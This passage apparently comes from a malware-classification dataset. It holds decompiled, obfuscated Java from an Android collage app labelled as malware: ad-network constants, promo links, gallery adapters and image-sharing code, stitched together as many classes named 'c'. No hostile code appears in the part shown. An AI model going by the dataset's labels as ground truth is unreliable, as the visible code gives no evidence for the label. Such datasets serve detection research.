PREF_LAST_OFFER3=""PREF_LAST_OFFER3"";   public static final String PREF_LAST_OFFER4=""PREF_LAST_OFFER4"";   public static final String PREF_LAST_OFFER5=""PREF_LAST_OFFER5"";   public static final String PREF_LAST_OFFER6=""PREF_LAST_OFFER6"";   public static final String PREF_LAST_OFFER7=""PREF_LAST_OFFER7"";   public static final String PREF_LAST_OFFER8=""PREF_LAST_OFFER8"";   public static final String PREF_LAST_URL=""PREF_LAST_URL"";   public static final String PREF_LAYOUT=""PREF_LAYOUT"";   public static final String PREF_LINE_SIZE=""PREF_LINE_SIZE"";   public static final String PREF_NEWQUOTE_RELOAD=""PREF_NEWQUOTE_RELOAD"";   public static final String PREF_QUOTE_PAGE=""PREF_QUOTE_PAGE"";   public static final String PREF_SEARCH_TYPE=""PREF_SEARCH_TYPE"";   public static final String PREF_SETTING_ITEM_PAGE=""PREF_SETTING_ITEM_PAGE"";   public static final String PREF_SHARE_OFFER=""PREF_SHARE_OFFER"";   public static final String PREF_SHARE_OFFER2=""PREF_SHARE_OFFER2"";   public static final String PREF_TIME=""PREF_TIME"";   public static final String PREF_TIME_TOP_YOUTUBE=""PREF_TIME_TOP_YOUTUBE"";   public static final String PREF_TIME_YOUTUBE=""PREF_TIME_YOUTUBE"";   public static final String PREF_TOKEN=""PREF_TOKEN"";   public static final String PREF_TOP_POSITION=""PREF_TOP_POSITION"";   public static final String PREF_WEB_RELOAD=""PREF_WEB_RELOAD"";   static final String PUBLISHER=""Pornpen Sub"";   public static final int QUIT_RESULT=1;   public static final int RATE_DURATION_HOUR=24;   public static final String RATE_FILENAME=""ratecameditor"";   public static final String REVMOB_APPLICATION_ID=""4fdb5eed1747230884000010"";   public static final String SEARCH_PREFERENCE=""CAMERA360_PREFERENCE"";   public static final int SMALL_SIZE=50;   public static final int SOMA_ADSPACE_ID=65817757;   public static final int SOMA_PUBLISHER_ID=923835513;   static final String START_FILE_NAME=""CE360_"";   public static final int SWIPE_LEFT=0;   public static final int SWIPE_MAX_OFF_PATH=70;   public static final int SWIPE_MIN_DISTANCE=100;   public static final int SWIPE_NONE=-1;   public static final int SWIPE_RIGHT=1;   public static final int SWIPE_THRESHOLD_VELOCITY=4;   public static final String TAB_BOOKMARK=""BookmarkTab"";   public static final String TAB_HISTORY=""HistoryTab"";   public static final String TAB_SEARCH=""SearchTab"";   public static final String TAB_YOUTUBE=""YoutubeTab"";   public static final int TEXTSIZE=100;   public static final String TOPMUSICVIDEO=""http://s3.amazonaws.com/adrollo-custom-images/760cdce4a613f2a30ba8cacdc8d44637.jpg"";   public static final String TOPMUSICVIDEO_URL=""market://details?id=com.js.topmusicvideo"";   public static final String TOPYOUTUBE=""http://s3.amazonaws.com/adrollo-custom-images/9553c5c8845d89947a667f0ee95774a9.jpg"";   public static final String TOPYOUTUBE_URL=""market://details?id=com.js.topyoutube"";   public static final String TRUEVISIONS=""http://s3.amazonaws.com/adrollo-custom-images/f208115e0d56e45653f7cd8581431b12.jpg"";   public static final String TRUEVISIONS_URL=""market://details?id=com.js.truevisions"";   public static final int UPDATE_DURATION_HOUR=6;   public static final int UPDATE_FREQ_SECOND=30;   public static final int VIEW_COLUMN=1;   public static final int VIEW_DETAIL=0;   public static final int VIEW_GALLERY=2;   public static final int VIEW_GRID=2;   public static final int VIEW_HOME=0;   public static final int VIEW_LIST=1;   public static final int VIEW_SETTING=3;   public static final int WAIT_DURATION_MILLI_SECOND=0;   public static final String WEBCAPTURE=""http://s3.amazonaws.com/adrollo-custom-images/80280e6931b00838bd43a03b21d194ff.jpg"";   public static final String WEBCAPTURE_URL=""market://details?id=com.js.webcapture"";   public static final String WEBTRANSLATE=""http://s3.amazonaws.com/adrollo-custom-images/f7a734b9076b5e326f3754ad808401d4.jpg"";   public static final String WEBTRANSLATE_URL=""market://details?id=com.js.webtranslate"";   public static final int WIDGET_COUNT_ADS=2;   public static final int WIDGET_DELAY_MILLI_SECOND=12000;   public static final int WIDGET_EXPIRED_DURATION=3;   public static final int WIDGET_MOBILE=1;   public static final int WIDGET_NO_CONNECTION=0;   public static final int WIDGET_UPDATE_DURATION=1;   public static final int WIDGET_WIFI=2;   public static final String WIFREE=""http://s3.amazonaws.com/adrollo-custom-images/8612df0313c4f9bac3ae22594d35c46f.jpg"";   public static final String WIFREE_URL=""market://details?id=com.autowifi"";   public static final String YOUTUBECHART=""http://s3.amazonaws.com/adrollo-custom-images/fa0a69625527b6501c46a3f9ac33f3f4.jpg"";   public static final String YOUTUBECHART2=""http://s3.amazonaws.com/adrollo-custom-images/c8527195d38d362d57ed7ae14e676e78.jpg"";   public static final String YOUTUBECHART2_URL=""market://details?id=com.js.youtubechart"";   public static final String YOUTUBECHART_URL=""market://details?id=com.js.youtubechart"";   public static final String YOUTUBECOMEDY=""http://s3.amazonaws.com/adrollo-custom-images/c67b359ce18c8600b6960f24461fb14a.jpg"";   public static final String YOUTUBECOMEDY_URL=""market://details?id=com.js.youtubecomedy"";   public static final String YOUTUBESPORT=""http://s3.amazonaws.com/adrollo-custom-images/ac685c944bf003cb3be1f668b7874f3a.jpg"";   public static final String YOUTUBESPORT_URL=""market://details?id=com.js.youtubecomedy"";   public static String a=""fake://fake.com"";   public static String b=""fake://fake2.com"";   public static String c=""com.js.googleadvancesearch.WIFI_REFRESHED"";   public static String d=""http://www.google.com"";   public static String e=""URL"";   public static String f=""BROWSER_SEARCH_TYPE"";   public static String g=""BROWSER_RAW_KEYWORD"";   public static String h=""BROWSER_KEYWORD_TYPE"";   public static String i=""BROWSER_FILE_TYPE"";   public static String j=""BROWSER_RECENT_UPDATE"";   public static String k=""BROWSER_DOMAIN"";   public static int l=1;   public static int m=2;   public enum a {  TEXT,   PHONE,   MEDRECT,   VIDEO,   SKY,   LEADER,   RICH_MEDIA,   SETTINGS;   public static a[] valuesCustom(){     a[] valuesCustom=values();     int length=valuesCustom.length;     a[] aVarArr=new a[length];     System.arraycopy(valuesCustom,0,aVarArr,0,length);     return aVarArr;   } }   public enum b {  NEW_BACKGROUND,   BACKGROUND,   NEW_FRAME,   FRAME,   DRAWING,   NEW_DRAWING;   public static b[] valuesCustom(){     b[] valuesCustom=values();     int length=valuesCustom.length;     b[] bVarArr=new b[length];     System.arraycopy(valuesCustom,0,bVarArr,0,length);     return bVarArr;   } }   public enum c {  LEFT,   CENTER,   RIGHT;   public static c[] valuesCustom(){     c[] valuesCustom=values();     int length=valuesCustom.length;     c[] cVarArr=new c[length];     System.arraycopy(valuesCustom,0,cVarArr,0,length);     return cVarArr;   } }   public static String a(  String str){     int lastIndexOf=str.lastIndexOf(47);     int lastIndexOf2=str.lastIndexOf(46);     if (lastIndexOf2 == -1) {       return String.valueOf(str.substring(lastIndexOf + 1)) + ""."" + EXTENSION2;     }     return String.valueOf(str.substring(lastIndexOf + 1,lastIndexOf2)) + ""."" + EXTENSION2;   }   public static String a(  String str,  String str2){     int lastIndexOf=str.lastIndexOf(47);     int lastIndexOf2=str.lastIndexOf(46);     if (lastIndexOf2 == -1) {       return String.valueOf(str.substring(lastIndexOf + 1)) + ""."" + str2;     }     return String.valueOf(str.substring(lastIndexOf + 1,lastIndexOf2)) + ""."" + str2;   }   public static String a(){     return new SimpleDateFormat(""yyyy-MM-dd-HH-mm-ss-SSS"").format((Date)new java.sql.Date(System.currentTimeMillis()));   }   public static String b(  String str){     int lastIndexOf=str.lastIndexOf(47);     int lastIndexOf2=str.lastIndexOf(46);     if (lastIndexOf2 == -1) {       return String.valueOf(str.substring(lastIndexOf + 1)) + ""_"" + a()+ "".png"";     }     return String.valueOf(str.substring(lastIndexOf + 1,lastIndexOf2)) + ""_"" + a()+ "".png"";   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\c.code","public static class c {   Bitmap a;   String b;   private int c;   private String d;   private String e;   private String f;   c(  Bitmap bitmap,  int i,  String str,  String str2,  String str3,  String str4){     this.a=bitmap;     this.c=i;     this.d=str;     this.e=str2;     this.f=str3;     this.b=str4;   }   public Bitmap a(){     return this.a;   }   public String b(){     return this.e;   } } public class c extends AsyncTask<Object,d,Object> {   private boolean c=false;   ArrayList a=new ArrayList();   c(){   }   public void a(){     this.a.add(Integer.valueOf(R.drawable.pattern1));     this.a.add(Integer.valueOf(R.drawable.pattern1_1));     this.a.add(Integer.valueOf(R.drawable.pattern1_2));     this.a.add(Integer.valueOf(R.drawable.pattern1_3));     this.a.add(Integer.valueOf(R.drawable.pattern1_4));     this.a.add(Integer.valueOf(R.drawable.pattern2));     this.a.add(Integer.valueOf(R.drawable.pattern6));     this.a.add(Integer.valueOf(R.drawable.pattern7));     this.a.add(Integer.valueOf(R.drawable.pattern8));     this.a.add(Integer.valueOf(R.drawable.pattern9));     this.a.add(Integer.valueOf(R.drawable.pattern10));     this.a.add(Integer.valueOf(R.drawable.pattern11));     this.a.add(Integer.valueOf(R.drawable.pattern12));     this.a.add(Integer.valueOf(R.drawable.pattern13));     this.a.add(Integer.valueOf(R.drawable.pattern14));     this.a.add(Integer.valueOf(R.drawable.pattern15));     this.a.add(Integer.valueOf(R.drawable.pattern16));     this.a.add(Integer.valueOf(R.drawable.pattern17));     this.a.add(Integer.valueOf(R.drawable.pattern18));     this.a.add(Integer.valueOf(R.drawable.pattern19));     this.a.add(Integer.valueOf(R.drawable.pattern20));     this.a.add(Integer.valueOf(R.drawable.pattern21));     this.a.add(Integer.valueOf(R.drawable.pattern22));     this.a.add(Integer.valueOf(R.drawable.pattern23));     this.a.add(Integer.valueOf(R.drawable.pattern24));     this.a.add(Integer.valueOf(R.drawable.pattern25));     this.a.add(Integer.valueOf(R.drawable.pattern26));     this.a.add(Integer.valueOf(R.drawable.pattern27));     this.a.add(Integer.valueOf(R.drawable.pattern28));     this.a.add(Integer.valueOf(R.drawable.pattern30));     this.a.add(Integer.valueOf(R.drawable.pattern31));     this.a.add(Integer.valueOf(R.drawable.pattern34));   }   @Override protected Object doInBackground(  Object... objArr){     a();     int size=this.a.size();     aj.this.m=size;     aj.this.l=0;     for (int i=0; i < size; i++) {       int parseInt=Integer.parseInt(this.a.get(i).toString());       String string=aj.this.k.getResources().getString(parseInt);       a aVar=new a(string,'/','.');       String a=aVar.a();       String b=aVar.b();       Bitmap decodeResource=BitmapFactory.decodeResource(aj.this.k.getResources(),parseInt);       if (decodeResource != null) {         Bitmap createScaledBitmap=Bitmap.createScaledBitmap(decodeResource,dev.camera360.collage.a.b.a(aj.this.k.getResources(),80),dev.camera360.collage.a.b.a(aj.this.k.getResources(),80),true);         decodeResource.recycle();         if (createScaledBitmap != null) {           publishProgress(new d(createScaledBitmap,parseInt,"""",a,b,string));         }       }       if (this.c) {         return null;       }     }     return null;   }   public void b(){     this.c=true;   }   @Override public void onProgressUpdate(  d... dVarArr){     aj.this.a(dVarArr);   }   @Override protected void onPostExecute(  Object obj){     if (this.c) {       aj.this.w.a();     }   } } public class c extends Handler {   public static final int ID_METADATA_DOWNLOADED=0;   public static final int ID_SHOW_IMAGE=1;   public static final int ID_UPDATE_ADAPTER=2;   public c(){   }   @Override public void handleMessage(  Message message){ switch (message.what) { case 0:       if (message.obj != null) {         an.this.q=(ArrayList)message.obj;         an.this.h=new b(an.this.a.getApplicationContext(),an.this.q);         an.this.i.setAdapter((ListAdapter)an.this.h);         int i=0;         while (true) {           int i2=i;           if (i2 >= an.this.h.getCount()) {             break;           }  else {             new ap.a(an.this.g,an.this.h.a().get(i2)).start();             i=i2 + 1;           }         }       }     break; case 1:   if (message.obj != null) {     an.this.b.hide();     if (an.this.k == BaseActivity.b.NEW_BACKGROUND) {       ((u)an.this.j).a((Bitmap)message.obj,""flickr"");       break;     }  else     if (an.this.k == BaseActivity.b.NEW_FRAME) {       ((aa)an.this.j).a((Bitmap)message.obj,""flickr"");       break;     }  else     if (an.this.k == BaseActivity.b.NEW_DRAWING) {       ((x)an.this.j).b((Bitmap)message.obj,""flickr"");       break;     }   } break; case 2: an.this.h.notifyDataSetChanged(); break; } super.handleMessage(message); } } public class c extends Thread implements DialogInterface.OnCancelListener {   private String b;   private ProgressDialog c;   private boolean d=false;   public void a(  File file,  File file2) throws IOException {     FileInputStream fileInputStream=new FileInputStream(file);     FileOutputStream fileOutputStream=new FileOutputStream(file2);     byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];     while (true) {       int read=fileInputStream.read(bArr);       if (read > 0) {         fileOutputStream.write(bArr,0,read);       }  else {         fileInputStream.close();         fileOutputStream.close();         return;       }     }   }   public void a(  String str) throws IOException {     File file=new File(at.this.a,str);     String substring=str.substring(str.lastIndexOf(""."") + 1);     if (substring.toLowerCase().equals(BaseActivity.EXTENSION2)) {       Intent intent=new Intent(""android.intent.action.SEND"");       Uri parse=Uri.parse(""file://"" + file.getAbsolutePath());       intent.putExtra(""android.intent.extra.SUBJECT"","""");       intent.putExtra(""android.intent.extra.TEXT"","""");       intent.putExtra(""android.intent.extra.STREAM"",parse);       intent.setType(""image/jpeg"");       at.this.e.startActivity(Intent.createChooser(intent,""Share Image""));       return;     }     if (substring.toLowerCase().equals(""png"")) {       Intent intent2=new Intent(""android.intent.action.SEND"");       Uri parse2=Uri.parse(""file://"" + file.getAbsolutePath());       intent2.putExtra(""android.intent.extra.SUBJECT"","""");       intent2.putExtra(""android.intent.extra.TEXT"","""");       intent2.putExtra(""android.intent.extra.STREAM"",parse2);       intent2.setType(""image/png"");       at.this.e.startActivity(Intent.createChooser(intent2,""Share Image""));       return;     }     File file2=new File(at.this.b,BaseActivity.a(str));     if (file2.exists()) {       file2.delete();     }     a(file,file2);     Intent intent3=new Intent(""android.intent.action.SEND"");     Uri parse3=Uri.parse(""file://"" + file2.getAbsolutePath());     intent3.putExtra(""android.intent.extra.SUBJECT"","""");     intent3.putExtra(""android.intent.extra.TEXT"","""");     intent3.putExtra(""android.intent.extra.STREAM"",parse3);     intent3.setType(""image/jpeg"");     at.this.e.startActivity(Intent.createChooser(intent3,""Share Image""));     try {       file2.deleteOnExit();     }  catch (    Exception e) {       file2.delete();     }   }   public c(  String str){     this.b=str;     this.c=new ProgressDialog(at.this.e);     this.c.setIndeterminate(true);     this.c.setMessage(at.this.e.getText(R.string.progress_dialog_sharing_image));     this.c.setCancelable(true);     this.c.setOnCancelListener(this);     this.c.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.d=true;   }   @Override public void run(){     try {       a(this.b);     }  catch (    IOException e) {       this.d=true;     }     if (this.d) {       this.d=false;     }     if (this.c.isShowing()) {       this.c.dismiss();     }   } } public class c extends Thread implements DialogInterface.OnCancelListener {   private String b;   private ProgressDialog c;   private boolean d=false;   public void a(  File file,  File file2) throws IOException {     FileInputStream fileInputStream=new FileInputStream(file);     FileOutputStream fileOutputStream=new FileOutputStream(file2);     byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];     while (true) {       int read=fileInputStream.read(bArr);       if (read > 0) {         fileOutputStream.write(bArr,0,read);       }  else {         fileInputStream.close();         fileOutputStream.close();         return;       }     }   }   public void a(  String str) throws IOException {     File file=new File(au.this.d,str);     String substring=str.substring(str.lastIndexOf(""."") + 1);     if (substring.toLowerCase().equals(BaseActivity.EXTENSION2)) {       Intent intent=new Intent(""android.intent.action.SEND"");       Uri parse=Uri.parse(""file://"" + file.getAbsolutePath());       intent.putExtra(""android.intent.extra.SUBJECT"","""");       intent.putExtra(""android.intent.extra.TEXT"","""");       intent.putExtra(""android.intent.extra.STREAM"",parse);       intent.setType(""image/jpeg"");       au.this.f.startActivity(Intent.createChooser(intent,""Share Image""));       return;     }     if (substring.toLowerCase().equals(""png"")) {       Intent intent2=new Intent(""android.intent.action.SEND"");       Uri parse2=Uri.parse(""file://"" + file.getAbsolutePath());       intent2.putExtra(""android.intent.extra.SUBJECT"","""");       intent2.putExtra(""android.intent.extra.TEXT"","""");       intent2.putExtra(""android.intent.extra.STREAM"",parse2);       intent2.setType(""image/png"");       au.this.f.startActivity(Intent.createChooser(intent2,""Share Image""));       return;     }     File file2=new File(au.this.c,BaseActivity.a(str));     if (file2.exists()) {       file2.delete();     }     a(file,file2);     Intent intent3=new Intent(""android.intent.action.SEND"");     Uri parse3=Uri.parse(""file://"" + file2.getAbsolutePath());     intent3.putExtra(""android.intent.extra.SUBJECT"","""");     intent3.putExtra(""android.intent.extra.TEXT"","""");     intent3.putExtra(""android.intent.extra.STREAM"",parse3);     intent3.setType(""image/jpeg"");     au.this.f.startActivity(Intent.createChooser(intent3,""Share Image""));     try {       file2.deleteOnExit();     }  catch (    Exception e) {       file2.delete();     }   }   public c(  String str){     this.b=str;     this.c=new ProgressDialog(au.this.f);     this.c.setIndeterminate(true);     this.c.setMessage(au.this.f.getText(R.string.progress_dialog_sharing_image));     this.c.setCancelable(true);     this.c.setOnCancelListener(this);     this.c.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.d=true;   }   @Override public void run(){     try {       a(this.b);     }  catch (    IOException e) {       this.d=true;     }     if (this.d) {       this.d=false;     }     if (this.c.isShowing()) {       this.c.dismiss();     }   } } private static class c {   private View a;   private ImageView b=null;   private ImageButton c=null;   private ImageButton d=null;   private ImageButton e=null;   private ImageButton f=null;   private ProgressBar g=null;   public c(  View view){     this.a=view;   }   public ImageView a(){     if (this.b == null) {       this.b=(ImageView)this.a.findViewById(R.id.image_view);     }     return this.b;   }   public ProgressBar b(){     if (this.g == null) {       this.g=(ProgressBar)this.a.findViewById(R.id.progressBar1);     }     return this.g;   }   public ImageButton c(){     if (this.c == null) {       this.c=(ImageButton)this.a.findViewById(R.id.zoom_button);     }     return this.c;   }   public ImageButton d(){     if (this.d == null) {       this.d=(ImageButton)this.a.findViewById(R.id.paint_button);     }     return this.d;   }   public ImageButton e(){     if (this.f == null) {       this.f=(ImageButton)this.a.findViewById(R.id.editor_button);     }     return this.f;   }   public ImageButton f(){     if (this.e == null) {       this.e=(ImageButton)this.a.findViewById(R.id.delete_button);     }     return this.e;   } } private static class c {   private View a;   private ImageView b=null;   private ImageButton c=null;   private ImageButton d=null;   private ImageButton e=null;   private ImageButton f=null;   private ProgressBar g=null;   public c(  View view){     this.a=view;   }   public ProgressBar a(){     if (this.g == null) {       this.g=(ProgressBar)this.a.findViewById(R.id.progressBar1);     }     return this.g;   }   public ImageView b(){     if (this.b == null) {       this.b=(ImageView)this.a.findViewById(R.id.image_view);     }     return this.b;   }   public ImageButton c(){     if (this.c == null) {       this.c=(ImageButton)this.a.findViewById(R.id.zoom_button);     }     return this.c;   }   public ImageButton d(){     if (this.d == null) {       this.d=(ImageButton)this.a.findViewById(R.id.paint_button);     }     return this.d;   }   public ImageButton e(){     if (this.e == null) {       this.e=(ImageButton)this.a.findViewById(R.id.delete_button);     }     return this.e;   }   public ImageButton f(){     if (this.f == null) {       this.f=(ImageButton)this.a.findViewById(R.id.editor_button);     }     return this.f;   } } public class c extends Thread implements DialogInterface.OnCancelListener {   private String b;   private ProgressDialog c;   private boolean d=false;   public void a(  File file,  File file2) throws IOException {     FileInputStream fileInputStream=new FileInputStream(file);     FileOutputStream fileOutputStream=new FileOutputStream(file2);     byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];     while (true) {       int read=fileInputStream.read(bArr);       if (read > 0) {         fileOutputStream.write(bArr,0,read);       }  else {         fileInputStream.close();         fileOutputStream.close();         return;       }     }   }   public void a(  String str) throws IOException {     File file=new File(str);     String substring=str.substring(str.lastIndexOf(""."") + 1);     if (substring.toLowerCase().equals(BaseActivity.EXTENSION2)) {       Intent intent=new Intent(""android.intent.action.SEND"");       Uri parse=Uri.parse(""file://"" + file.getAbsolutePath());       intent.putExtra(""android.intent.extra.SUBJECT"","""");       intent.putExtra(""android.intent.extra.TEXT"","""");       intent.putExtra(""android.intent.extra.STREAM"",parse);       intent.setType(""image/jpeg"");       b.this.d.startActivity(Intent.createChooser(intent,""Share Image""));       return;     }     if (substring.toLowerCase().equals(""png"")) {       Intent intent2=new Intent(""android.intent.action.SEND"");       Uri parse2=Uri.parse(""file://"" + file.getAbsolutePath());       intent2.putExtra(""android.intent.extra.SUBJECT"","""");       intent2.putExtra(""android.intent.extra.TEXT"","""");       intent2.putExtra(""android.intent.extra.STREAM"",parse2);       intent2.setType(""image/png"");       b.this.d.startActivity(Intent.createChooser(intent2,""Share Image""));       return;     }     File file2=new File(b.this.a,BaseActivity.a(str));     if (file2.exists()) {       file2.delete();     }     a(file,file2);     Intent intent3=new Intent(""android.intent.action.SEND"");     Uri parse3=Uri.parse(""file://"" + file2.getAbsolutePath());     intent3.putExtra(""android.intent.extra.SUBJECT"","""");     intent3.putExtra(""android.intent.extra.TEXT"","""");     intent3.putExtra(""android.intent.extra.STREAM"",parse3);     intent3.setType(""image/jpeg"");     b.this.d.startActivity(Intent.createChooser(intent3,""Share Image""));     try {       file2.deleteOnExit();     }  catch (    Exception e) {       file2.delete();     }   }   public c(  String str){     this.b=str;     this.c=new ProgressDialog(b.this.d);     this.c.setIndeterminate(true);     this.c.setMessage(b.this.d.getText(R.string.progress_dialog_sharing_image));     this.c.setCancelable(true);     this.c.setOnCancelListener(this);     this.c.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.d=true;   }   @Override public void run(){     try {       a(this.b);     }  catch (    IOException e) {       this.d=true;     }     if (this.d) {       this.d=false;     }     if (this.c.isShowing()) {       this.c.dismiss();     }   } } public class c extends BaseAdapter {   boolean a;   public int d;   Cursor e;   int i;   int j;   int k;   Dialog m;   private o[] n;   private Context o;   private a p;   public int b=0;   public int c=0;   public String f=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER3+ ""/album/"";   boolean g=false;   boolean h=false;   ArrayList<String> l=new ArrayList<>();   private boolean c(){     DisplayMetrics displayMetrics=this.o.getResources().getDisplayMetrics();     return displayMetrics.heightPixels >= 728 && displayMetrics.widthPixels >= 728;   }   public c(  Context context,  int i,  int i2,  boolean z,  Dialog dialog){     this.a=false;     this.d=1;     this.j=100;     this.k=130;     this.m=dialog;     this.o=context;     this.i=i;     this.d=i2;     this.a=z;     if (c()) {       this.j=AdException.INTERNAL_ERROR;       this.k=260;     }     a();   }   public void a(){     b();     this.p=new a(this,null);     this.e=((Activity)this.o).managedQuery(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,new String[]{AnalyticsSQLiteHelper.GENERAL_ID,""_data"",""title"",""_display_name"",""description""},""_data LIKE '%C360%'"",null,""date_added DESC"");     int columnIndexOrThrow=this.e.getColumnIndexOrThrow(AnalyticsSQLiteHelper.GENERAL_ID);     int columnIndexOrThrow2=this.e.getColumnIndexOrThrow(""description"");     int columnIndexOrThrow3=this.e.getColumnIndexOrThrow(""_data"");     int columnIndexOrThrow4=this.e.getColumnIndexOrThrow(""_display_name"");     int columnIndexOrThrow5=this.e.getColumnIndexOrThrow(""title"");     this.b=this.e.getCount();     this.c=(int)Math.ceil(this.b / 12.0f);     int i=(this.d - 1) * 12;     int i2=i + 12;     if (i2 > this.b) {       i2=this.b;     }     this.n=new o[i2 - i];     int i3=0;     while (i < i2) {       this.e.moveToPosition(i);       int i4=this.e.getInt(columnIndexOrThrow);       this.e.getString(columnIndexOrThrow2);       this.e.getString(columnIndexOrThrow5);       this.e.getString(columnIndexOrThrow4);       String string=this.e.getString(columnIndexOrThrow3);       Uri withAppendedPath=Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,new StringBuilder().append(i4).toString());       this.n[i3]=new o();       this.n[i3].b=withAppendedPath;       this.n[i3].c=string;       i3++;       i++;     }     this.e.close();     this.p.execute(this.n);   }   @Override public int getCount(){     return this.n.length;   }   @Override public Object getItem(  int i){     return this.n[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView;     o oVar=this.n[i];     if (view == null) {       imageView=new ImageView(this.o);       imageView.setLayoutParams(new AbsListView.LayoutParams(this.j,this.k));     }  else {       imageView=(ImageView)view;     }     if (oVar.e != null) {       imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);       imageView.setImageBitmap(oVar.e);     }     imageView.setTag(oVar.c);     return imageView;   }   public void d(){     notifyDataSetChanged();   }   public Bitmap a(  String str){     BitmapFactory.Options options=new BitmapFactory.Options();     options.inSampleSize=4;     options.inDither=false;     options.inPurgeable=true;     options.inInputShareable=true;     options.inTempStorage=new byte[16384];     try {       File file=new File(str);       if (file.exists()) {         return BitmapFactory.decodeFile(file.toString(),options);       }       return null;     }  catch (    Exception e) {       return null;     }   } public class a extends AsyncTask<o,Void,Void> {     private a(){     }     a(    c cVar,    a aVar){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         oVar.e=c.this.a(oVar.c);         oVar.d=oVar.c;         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       c.this.d();     }     @Override public void onPostExecute(    Void r3){       if ((c.this.m instanceof d) && c.this.a) {         ((d)c.this.m).b(c.this.c);       }     }   }   public void b(){     if (this.p != null && this.p.getStatus() != AsyncTask.Status.FINISHED) {       this.p.cancel(true);     }   } } public class c extends Handler {   public static final int ID_METADATA_DOWNLOADED=0;   public static final int ID_SHOW_IMAGE=1;   public static final int ID_UPDATE_ADAPTER=2;   public c(){   }   @Override public void handleMessage(  Message message){ switch (message.what) { case 0:       if (message.obj != null) {         h.this.o=(ArrayList)message.obj;         h.this.h=new a(h.this.a.getApplicationContext(),h.this.o);         h.this.i.setAdapter((ListAdapter)h.this.h);         int i=0;         while (true) {           int i2=i;           if (i2 >= h.this.h.getCount()) {             break;           }  else {             new i.a(h.this.g,h.this.h.a().get(i2)).start();             i=i2 + 1;           }         }       }     break; case 1:   if (message.obj != null) {     h.this.b.hide();     if (h.this.k == BaseActivity.b.NEW_BACKGROUND) {       ((u)h.this.j).a((Bitmap)message.obj,""flickr"");       break;     }  else     if (h.this.k == BaseActivity.b.NEW_FRAME) {       ((aa)h.this.j).a((Bitmap)message.obj,""flickr"");       break;     }  else     if (h.this.k == BaseActivity.b.NEW_DRAWING) {       ((x)h.this.j).a((Bitmap)message.obj,""flickr"");       break;     }   } break; case 2: h.this.h.notifyDataSetChanged(); break; } super.handleMessage(message); } } protected class c extends AsyncTask<Void,Void,Void> {   protected c(){   }   @Override public Void doInBackground(  Void... voidArr){     return null;   }   @Override public void onPostExecute(  Void r4){     super.onPostExecute(r4);     try {       new ar(TabSample.this,R.style.Dialog_Translucent).show();     }  catch (    Exception e) {     }   } } public static class c {   Bitmap a;   String b;   private int c;   private String d;   private String e;   private String f;   c(  Bitmap bitmap,  int i,  String str,  String str2,  String str3,  String str4){     this.a=bitmap;     this.c=i;     this.d=str;     this.e=str2;     this.f=str3;     this.b=str4;   }   public Bitmap a(){     return this.a;   }   public String b(){     return this.d;   } } public class c extends BaseAdapter {   int a;   private Context c;   private ArrayList<f> d=new ArrayList<>();   private int e;   public c(  Context context,  int i){     this.c=context;     this.a=i;     TypedArray obtainStyledAttributes=x.this.D.obtainStyledAttributes(R.styleable.Gallery1);     this.e=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();   }   public void a(){     this.d.clear();   }   public void a(  f fVar){     this.d.add(fVar);   }   @Override public int getCount(){     return this.d.size();   }   @Override public Object getItem(  int i){     return this.d.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView=new ImageView(x.this.D);     f fVar=this.d.get(i);     imageView.setImageBitmap(fVar.a());     imageView.setTag(fVar.b());     imageView.setScaleType(ImageView.ScaleType.FIT_XY);     imageView.setLayoutParams(new Gallery.LayoutParams(dev.camera360.collage.a.b.a(x.this.D.getResources(),100),dev.camera360.collage.a.b.a(x.this.D.getResources(),80)));     imageView.setBackgroundResource(this.e);     return imageView;   } } public class c extends AsyncTask<Object,d,Object> {   private boolean c=false;   ArrayList a=new ArrayList();   c(){   }   public void a(){     this.a.add(Integer.valueOf(R.drawable.pattern1));     this.a.add(Integer.valueOf(R.drawable.pattern1_1));     this.a.add(Integer.valueOf(R.drawable.pattern1_2));     this.a.add(Integer.valueOf(R.drawable.pattern1_3));     this.a.add(Integer.valueOf(R.drawable.pattern1_4));     this.a.add(Integer.valueOf(R.drawable.pattern2));     this.a.add(Integer.valueOf(R.drawable.pattern6));     this.a.add(Integer.valueOf(R.drawable.pattern7));     this.a.add(Integer.valueOf(R.drawable.pattern8));     this.a.add(Integer.valueOf(R.drawable.pattern9));     this.a.add(Integer.valueOf(R.drawable.pattern10));     this.a.add(Integer.valueOf(R.drawable.pattern11));     this.a.add(Integer.valueOf(R.drawable.pattern12));     this.a.add(Integer.valueOf(R.drawable.pattern13));     this.a.add(Integer.valueOf(R.drawable.pattern14));     this.a.add(Integer.valueOf(R.drawable.pattern15));     this.a.add(Integer.valueOf(R.drawable.pattern16));     this.a.add(Integer.valueOf(R.drawable.pattern17));     this.a.add(Integer.valueOf(R.drawable.pattern18));     this.a.add(Integer.valueOf(R.drawable.pattern19));     this.a.add(Integer.valueOf(R.drawable.pattern20));     this.a.add(Integer.valueOf(R.drawable.pattern21));     this.a.add(Integer.valueOf(R.drawable.pattern22));     this.a.add(Integer.valueOf(R.drawable.pattern23));     this.a.add(Integer.valueOf(R.drawable.pattern24));     this.a.add(Integer.valueOf(R.drawable.pattern25));     this.a.add(Integer.valueOf(R.drawable.pattern26));     this.a.add(Integer.valueOf(R.drawable.pattern27));     this.a.add(Integer.valueOf(R.drawable.pattern28));     this.a.add(Integer.valueOf(R.drawable.pattern30));     